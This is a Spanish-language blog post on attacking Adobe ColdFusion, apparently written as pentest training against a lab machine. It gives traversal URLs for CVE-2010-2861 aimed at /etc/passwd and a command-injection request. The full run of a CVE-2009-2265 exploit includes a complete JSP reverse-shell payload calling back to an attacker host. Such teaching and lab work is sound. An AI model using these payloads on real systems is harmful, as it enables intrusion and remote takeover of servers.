---
date: 2025-11-23T00:51:05.000Z
layout: post
comments: true
title: "ColdFusion Hacking"
subtitle: 'Tipos de ataque'
description: >-
image: >-
  /images/coldfusionlogo.png
optimized_image: >-
  /images/coldfusionlogo.png
category: ciberseguridad
tags:
  - web
  - rce
  - owasp
  - CVE-2010-2861
  - CVE-2009-2265
author: Felipe Canales Cayuqueo
paginate: true
---

ColdFusion es una plataforma de desarrollo web creada por Adobe que permite construir aplicaciones dinámicas mediante un lenguaje de script llamado CFML (ColdFusion Markup Language). Está orientada a simplificar la interacción entre las páginas web y las bases de datos, permitiendo ejecutar consultas SQL (MySQL, Oracle y Microsoft SQL Server), generar contenido dinámico, manejar formularios y realizar tareas del lado del servidor de forma sencilla. Su arquitectura basada en etiquetas y funciones integradas facilita el desarrollo rápido de aplicaciones empresariales, aunque históricamente ha presentado vulnerabilidades críticas cuando no se actualiza o configura adecuadamente, especialmente en entornos con acceso público a sus servicios de administración.

Una aplicación web que utiliza ColdFusion puede identificarse mediante varios indicios. Las páginas suelen emplear extensiones **.cfm** o **.cfc** lo que constituye una señal directa de su uso. También es útil revisar los **encabezados HTTP**, ya que a menudo incluyen valores como *Server: ColdFusion* o *X-Powered-By: ColdFusion*. En caso de errores, los mensajes mostrados pueden hacer referencia a etiquetas o funciones específicas de ColdFusion. Además, la presencia de **archivos predeterminados** generados durante la instalación como *admin.cfm* o *CFIDE/administrator/index.cfm* es un indicador claro de que el servidor está ejecutando ColdFusion.


### Directory Traversal

Directory/Path Traversal es un ataque que permite a un atacante acceder a archivos y directorios ubicados fuera del directorio previsto por la aplicación web. Este ataque explota la falta de validación en los datos de entrada y puede realizarse a través de distintos campos, como parámetros en la URL, formularios, cookies, entre otros. En entornos ColdFusion, puede aprovecharse manipulando parámetros utilizados por etiquetas como **CFFile** y **CFDIRECTORY**, encargadas de operaciones relacionadas con archivos y directorios (carga, descarga, listado, etc.). Por ejemplo:

```
/index.cfm?directory=../../../etc/&file=passwd
```

Un caso relevante es **CVE-2010-2861**, una vulnerabilidad de *Directory Traversal* en Adobe ColdFusion (9.0.1 y versiones anteriores). Este fallo permite a atacantes remotos leer archivos arbitrarios manipulando el parámetro **locale** en ciertos archivos ColdFusion, como:

- CFIDE/administrator/settings/mappings.cfm  
- logging/settings.cfm  
- datasources/index.cfm  
- j2eepackaging/editarchive.cfm  
- CFIDE/administrator/enter.cfm  

La vulnerabilidad se activa al modificar el parámetro **locale** para escapar del directorio permitido y acceder a ubicaciones sensibles del sistema. Esto puede exponer archivos de configuración, credenciales o incluso ficheros del sistema operativo.

Ejemplo asociado al CVE:

```
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

Usando searchsploit o exploitdb se pueden detectar otros tipos de "Directory Traversal".

[![coldfusion1](/images/coldfusion1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/coldfusion1.png)

Donde podemos apreciar los directorios que posiblemente son vulnerables:

[![coldfusion2](/images/coldfusion2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/coldfusion2.png)

### Ejecución remota de código (no autenticado)

Una vulnerabilidad RCE no autenticada permite a un atacante ejecutar código arbitrario en un sistema de destino sin ninguna credencial de autenticación válida. 

En el siguiente fragmento de código:

```
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

La variable `cmd` se construye directamente a partir del valor de `cgi.query_string`, que contiene todo lo que el usuario envíe en la cadena de consulta de la URL. Luego, esta variable se pasa sin validación a la función `cfexecute`, la cual ejecuta el programa `cmd.exe` de Windows con los argumentos proporcionados. Debido a que no existe ningún tipo de control, sanitización o autenticación previa, este comportamiento introduce una vulnerabilidad crítica de **ejecución remota de código (RCE)**. Un atacante puede insertar comandos arbitrarios en la URL y estos serán ejecutados por el servidor con los permisos del proceso de ColdFusion. Esto permite modificar archivos, extraer información sensible o comprometer completamente el sistema.

Ejemplo de petición maliciosa (decodificada):

```
http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

Ejemplo codificado:

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```

Si volvemos a visualizar el mismo searchsploit ejecutado anteriormente podemos identificar un exploit válido.

[![coldfusion3](/images/coldfusion3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/coldfusion3.png)

Se trata de la vulnerabilidad ```CVE-2009-2265``` el cual son diversas brechas de recorrido de directorio en FCKeditor anterior a 2.6.4.1. El fallo se origina en la falta de validación de rutas dentro de ciertos módulos de conexión utilizados por el navegador de archivos del editor, lo que posibilita insertar secuencias de recorrido de directorios en las entradas enviadas al servidor. Para ello editamos el exploit de la siguiente forma:

[![coldfusion4](/images/coldfusion4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/coldfusion4.png)

Al ejecutar el exploit obtenemos una reverse shell.

```
┌──(root㉿nptg)-[/coldfusion]
└─# python3 coldfusionRCE.py 

Generating a payload...
Payload size: 1498 bytes
Saved as: c48af6b9c6f84107b2e4ffe162cb8473.jsp

Priting request...
Content-type: multipart/form-data; boundary=7b8dff42ee2b45a2bc38f3434de63772
Content-length: 1699

--7b8dff42ee2b45a2bc38f3434de63772
Content-Disposition: form-data; name="newfile"; filename="c48af6b9c6f84107b2e4ffe162cb8473.txt"
Content-Type: text/plain

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream pb;
    OutputStream ix;

    StreamConnector( InputStream pb, OutputStream ix )
    {
      this.pb = pb;
      this.ix = ix;
    }

    public void run()
    {
      BufferedReader tk  = null;
      BufferedWriter spG = null;
      try
      {
        tk  = new BufferedReader( new InputStreamReader( this.pb ) );
        spG = new BufferedWriter( new OutputStreamWriter( this.ix ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = tk.read( buffer, 0, buffer.length ) ) > 0 )
        {
          spG.write( buffer, 0, length );
          spG.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( tk != null )
          tk.close();
        if( spG != null )
          spG.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.136", 4646 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

--7b8dff42ee2b45a2bc38f3434de63772--


Sending request and printing response...


		<script type="text/javascript">
			window.parent.OnUploadCompleted( 0, "/userfiles/file/c48af6b9c6f84107b2e4ffe162cb8473.jsp/c48af6b9c6f84107b2e4ffe162cb8473.txt", "c48af6b9c6f84107b2e4ffe162cb8473.txt", "0" );
		</script>
	

Printing some information for debugging...
lhost: 10.10.14.136
lport: 4646
rhost: 10.129.38.244
rport: 8500
payload: c48af6b9c6f84107b2e4ffe162cb8473.jsp

Deleting the payload...
Listening for connection...
Executing the payload...
listening on [any] 4646 ...
connect to [10.10.14.136] from (UNKNOWN) [10.129.38.244] 49262
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>
```
